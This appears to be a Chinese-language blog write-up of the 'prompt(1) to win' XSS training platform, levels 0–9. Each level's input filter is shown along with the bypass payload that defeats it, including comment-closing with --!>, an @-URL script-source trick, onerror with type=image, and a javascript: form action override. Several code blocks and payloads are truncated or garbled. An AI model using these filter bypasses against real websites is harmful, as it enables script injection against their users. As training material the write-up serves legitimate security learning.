## 前言：
prompt（1）to
win是一个比较经典的xss训练平台，主要的目的是绕过代码的约束条件然后执行prompt（1）便成功过关，不涉及xss之后的一些利用。本人做了一轮下来，学习到许多js的特性和语法特点，收获还是很多的。有些题目比较简单，就没有说的太多，个人认为比较有意思的题目会比较详细的说明。
练习平台：
* * *
## 第0关
    function escape(input) {
        // warm up
        // script should be executed without user interaction
        return '';
    }
没有任何的过滤，直接闭合前后的尖括号即可
    payload: 1">``]+>/gi;
        input = input.replace(stripTagsRE, '');
        return '' + input + '';
    }
阅读代码，我们的输入经过了一段正则过滤
正则分析：过滤在<>里面的任何东西
  * ？：表示匹配前面的子表达式(/)零次或一次
  * [^>]：为负值字符集合，匹配未包含 > 的任意字符
  * +：表示匹配前面的子表达式一次或多次
  * gi：全局匹配+忽略大小写
**payload1: 
* * *
## 第3关
    function escape(input) {
        // filter potential comment end delimiters
        input = input.replace(/->/g, '_');
        // comment the input to avoid script execution
        return '';
    }
本题用_替换了-> , 不过用--！>也可闭合注释
    payload：--!>``
* * *
## 第4关
    function escape(input) {
        // make sure the script belongs to own site
        // sample script: http://prompt.ml/js/test.js
        if (/^(?:https?:)?\/\/prompt\.ml\//i.test(decodeURIComponent(input))) {
            var script = document.createElement('script');
            script.src = input;
            return script.outerHTML;
        } else {
            return 'Invalid resource.';
        }
    }
本题利用的是@的特性进行远程访问服务器的js文件，构造的payload可以当做是以
作为身份验证去访问请求localhost/xss.js，由于src引用了这个文件，所以在js文件上写入`prompt(1)`，理论可以弹出1，但是由于本题的正则匹配，所以必须打入
`http://prompt.ml/@localhost/xss.js`才能满足正则匹配，而浏览器并不允许这样的格式，但是代码中有decodeURIComponent函数，可以将/改为%2f，完成绕过。
**payload:`http://prompt.ml%2f@localhost/xss.js`**
* * *
## 第5关
    function escape(input) {
        // apply strict filter rules of level 0
        // filter ">" and event handlers
        input = input.replace(/>|on.+?=|focus/gi, '_');
        return '';
    }
替换分析：将> ,onxx=(也就是替换了 onerror
=),focus替换为_,我们可以使用type将属性覆盖为image，并且在html中，属性描述不在同一行并不影响解析，因此可以利用换行以及type覆盖类型构造onerror格式的xss
**payload:"src=# type=image onerror  
="prompt(1)**
* * *
## 第6关
    function escape(input) {
        // let's do a post redirection
        try {
            // pass in formURL#formDataJSON
            // e.g. http://httpbin.org/post#{"name":"Matt"}
            var segments = input.split('#');
            var formURL = segments[0];
            var formData = JSON.parse(segments[1]);
            var form = document.createElement('form');
            form.action = formURL;
            form.method = 'post';
            for (var i in formData) {
                var input = form.appendChild(document.createElement('input'));
                input.name = i;
                input.setAttribute('value', formData[i]);
            }
            return form.outerHTML + '                         \n\
                                                     \n\
            ';
        } catch (e) {
            return 'Invalid form data.';
        }
    }
根据代码以及注释，我们需要输入url#post格式的内容，最后的正则过滤了script和data，这样做的目的是防止我们利用JavaScript伪协议构造类似像action="javascript:alert(1)这样的语句。
js伪协议: javascript:alert("1") JavaScript后面的被解析为js语句，这样便是js的伪协议的应用
首先尝试构造javascript:prompt(1)#{"test":1}，但是很遗憾，document.forms[0]过滤了script和data字符，没有办法成功提交表单，不过可以利用action进行覆盖。  
action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。
以上是正确payload执行后的效果，也就是此时的action的值是1，绕过针对script的正则判断，成功提交表单。
**payload：javascript:prompt(1)#{"action":1}**
* * *
## 第7关
    function escape(input) {
        // pass in something like dog#cat#bird#mouse...
        var segments = input.split('#');
        return segments.map(function(title) {
            // title can only contain 12 characters
            return '';
        }).join('\n');
    }
代码限定了一次只能输入12个字符
可以利用#拆分为数组的特点以及注释符绕过
    /*">
    ">
以上是输入正确的payload的效果。
**payload:`">`**
* * *
## 第8关
    function escape(input) {
        // prevent input from getting out of comment
        // strip off line-breaks and stuff
        input = input.replace(/[\r\n'
在console模块输入，得到的便是payload，然而我在谷歌浏览器得到的字符串似乎没什么变化（u2028是unicode的行分隔符）
然而输入进去居然成功，乍一看觉得不可思议，其实粘贴到输入模块发现其实是有隐藏字符，真正的字符串解析的样子可以使用IE的console模块查看
* * *
## 第9关
    function escape(input) {
        // filter potential start-tags
        input = input.replace(/<([a-zA-Z])/g, '<_$1');
        // use all-caps for heading
        input = input.toUpperCase();